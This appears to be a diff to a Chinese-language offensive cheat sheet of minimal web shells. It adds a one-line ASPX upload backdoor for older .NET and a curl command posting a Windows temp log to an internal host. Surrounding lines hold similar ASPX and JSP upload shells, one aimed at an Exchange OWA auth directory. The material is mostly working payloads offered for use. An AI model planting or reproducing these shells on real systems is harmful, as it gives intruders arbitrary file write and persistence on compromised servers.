@@ -179,6 +179,10 @@ curl -X POST -F "file=@path_to_your_file" http://your_server_address/your_aspx_p
 <%Request.Files[0].SaveAs(Request["f"]+Request.Files[0].FileName);%>
 curl -k  -F "myfile=@t.txt" "http://127.0.0.1/owa/auth/3.aspx"   //-K 忽略证书
 
+低版本.net 2.0
+<%@ Page Language="C#" %><% if (Request.Files.Count > 0) Request.Files[0].SaveAs(Server.MapPath("./" + Request.Files[0].FileName)); %>
+curl -X POST -F "file=@c:/windows/temp/vm.log" http://192.168.1.3/up.aspx
+
 <%@ page import="java.io.*"%><% request.getPart("file").write(getServletContext().getRealPath("/") + "uploadDemo.jsp"); %>
 curl -X POST -F "file=@/path/to/your/file" http://your_server_address/your_upload_page.jsp
 
